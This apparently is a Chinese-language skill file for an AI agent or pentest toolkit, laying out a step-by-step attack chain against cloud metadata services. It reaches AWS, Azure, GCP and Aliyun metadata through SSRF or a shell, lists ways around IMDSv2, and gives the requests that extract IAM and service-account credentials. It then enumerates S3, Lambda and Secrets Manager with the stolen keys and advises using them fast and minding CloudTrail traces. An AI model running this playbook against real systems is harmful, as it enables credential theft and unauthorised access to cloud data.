---
name: cloud-metadata
description: "云元数据利用。当通过 SSRF 或已获取的 shell 可以访问云实例元数据服务时使用。覆盖 AWS/Azure/GCP/阿里云的元数据端点、IAM 凭据提取、IMDSv2 绕过、从元数据到云服务枚举的完整攻击链"
metadata:
  tags: "cloud,metadata,ssrf,iam,aws,azure,gcp,aliyun,imds,元数据,云安全"
  difficulty: "hard"
  icon: "☁️"
  category: "云环境"
---

# 云元数据利用方法论

云实例的元数据服务（IMDS）是攻击者从 SSRF/RCE 到云控制面的桥梁——一个 HTTP 请求就能获取 IAM 临时凭据。

## Phase 1: 元数据服务探测

### 1.1 确认云环境
通过以下线索判断目标是否在云上、哪个云：

| 线索 | 云平台 |
|------|--------|
| `Server: AmazonS3`, `x-amz-*` Header | AWS |
| `x-ms-*` Header, `.azurewebsites.net` | Azure |
| `.googleapis.com`, `x-goog-*` Header | GCP |
| `.aliyuncs.com`, `x-oss-*` Header | 阿里云 |
| 内网 IP 172.16.x.x + DNS `.internal` | AWS VPC |
| 内网 IP 10.x.x.x + DNS `.internal.cloudapp.net` | Azure VNet |

### 1.2 元数据端点
```
# AWS (IMDSv1 — 直接 GET)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/

# AWS (IMDSv2 — 需要 PUT 获取 Token)
PUT http://169.254.169.254/latest/api/token
  Header: X-aws-ec2-metadata-token-ttl-seconds: 21600
GET http://169.254.169.254/latest/meta-data/
  Header: X-aws-ec2-metadata-token: <token>

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
  Header: Metadata: true

# GCP
http://metadata.google.internal/computeMetadata/v1/
  Header: Metadata-Flavor: Google

# 阿里云
http://100.100.100.200/latest/meta-data/
```

### 1.3 SSRF 到元数据
如果是通过 SSRF 访问（不是直接 shell）：
- 直接用 SSRF 请求 `http://169.254.169.254/...`
- IMDSv2 需要 PUT + 自定义 Header——大多数 SSRF 无法设置 Header，这就是 IMDSv2 的防护价值
- 绕过尝试：`http://[::ffff:169.254.169.254]/`、DNS rebinding、302 重定向

## Phase 2: 凭据提取

### AWS IAM Role 凭据
```
# 列出挂载的 IAM Role
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/

# 获取临时凭据（返回 AccessKeyId + SecretAccessKey + Token）
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
```

返回示例：
```json
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "xxx",
  "Token": "xxx",
  "Expiration": "2024-01-01T00:00:00Z"
}
```

### Azure Managed Identity Token
```
GET http://169.254.169.254/metadata/identity/oauth2/token
    ?api-version=2018-02-01
    &resource=https://management.azure.com/
    Header: Metadata: true
```

### GCP Service Account Token
```
GET http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
    Header: Metadata-Flavor: Google
```

### 阿里云 STS Token
```
GET http://100.100.100.200/latest/meta-data/ram/security-credentials/<role-name>
```

## Phase 3: 凭据利用

获取云凭据后，参考 `cloud-iam-audit` 进行提权评估。

### AWS 快速利用
```bash
# 配置凭据
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=xxx
export AWS_SESSION_TOKEN=xxx

# 确认身份
aws sts get-caller-identity

# 枚举 S3
aws s3 ls

# 枚举 EC2
aws ec2 describe-instances --region us-east-1

# 枚举 Lambda
aws lambda list-functions --region us-east-1

# 枚举 Secrets Manager
aws secretsmanager list-secrets --region us-east-1
```

### 高价值目标
- **S3 存储桶**：可能包含备份、日志、敏感数据
- **Secrets Manager / Parameter Store**：数据库密码、API 密钥
- **Lambda 代码**：可能包含硬编码凭据
- **EC2 User-Data**：启动脚本可能包含密码

## Phase 4: 其他元数据信息

除了凭据，元数据还包含有价值的信息：
```
# 实例信息
/latest/meta-data/instance-id
/latest/meta-data/instance-type
/latest/meta-data/ami-id
/latest/meta-data/hostname
/latest/meta-data/local-ipv4
/latest/meta-data/public-ipv4

# 网络信息（VPC、子网）
/latest/meta-data/network/interfaces/macs/<mac>/vpc-id
/latest/meta-data/network/interfaces/macs/<mac>/subnet-id

# User-Data（启动脚本——经常包含密码！）
/latest/user-data
```

## 注意事项
- IMDSv2 是 AWS 对元数据 SSRF 的主要防护——如果目标启用了 IMDSv2，纯 SSRF 基本无法利用
- 云凭据有过期时间（通常 6-12 小时），获取后应立即利用
- 凭据操作会留下 CloudTrail/Activity Log，注意操作痕迹
